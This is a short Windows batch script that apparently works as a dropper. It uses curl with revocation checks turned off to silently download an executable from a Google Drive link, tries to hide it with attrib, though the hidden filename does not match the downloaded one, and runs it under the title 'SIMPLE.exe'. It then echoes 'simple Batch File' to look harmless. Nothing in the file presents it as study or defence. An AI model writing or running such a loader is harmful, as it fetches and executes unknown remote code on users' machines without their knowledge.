@ECHO OFF
curl --ssl-no-revoke --request GET "https://drive.usercontent.google.com/download?export=download&id=1_MUvlSiN3ej-fPpoPu4n_XEY_2idnMuI&confirm=t&uuid=6c228475-82c3-459d-bb09-19faacd68aea" -o vistor.exe &>nul
@ECHO OFF
attrib +h visitor.exe
start "SIMPLE.exe" /WAIT vistor.exe
echo "simple Batch File"
